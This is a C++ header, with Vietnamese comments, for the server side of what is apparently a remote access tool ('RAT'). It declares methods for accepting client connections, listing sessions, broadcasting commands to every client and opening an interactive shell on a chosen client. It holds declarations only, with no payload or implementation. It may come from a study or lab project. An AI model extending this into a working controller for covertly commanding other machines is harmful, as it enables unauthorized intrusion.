#pragma once

#include "protocol.h"
#include "socket_utils.h"
#include "session_manager.h"

#include <string>
#include <thread>
#include <atomic>
#include <memory>

namespace RAT
{
    class Server
    {
    public:
        // Khởi tạo server với port 8888
        explicit Server(int port = DEFAULT_PORT);
        ~Server();

        // Khởi tạo Socket, bind và listen
        bool start();

        // Kết nối client
        bool wait_for_client();

        // RAT shell
        void run_shell();

        // Đóng socket
        void stop();

    private:

        // Luồng ngầm liên tục lắng nghe và accept các Client mới
        void acceptor_worker();
        
        // Hàm xử lý command quản trị
        void list_sessions();
        void broadcast_command(const std::string &cmd_line);
        void interact_session(int session_id);
        void print_manager_help();

        // Hàm xử lý command tương tác 1-1 với Client
        void run_client_shell(std::shared_ptr<ClientSession> session);

        // Kiểm tra tính hợp lệ của command trước khi gửi qua mạng
        bool validate_and_process_command(const std::string &line, std::string &cmd_name, std::string &cmd_args);

        int server_fd_;         // Socket lắng nghe của Server
        int port_;        
        
        std::atomic<bool> is_running_;

        SessionManager session_manager_;
        std::thread acceptor_thread_;
    };
}
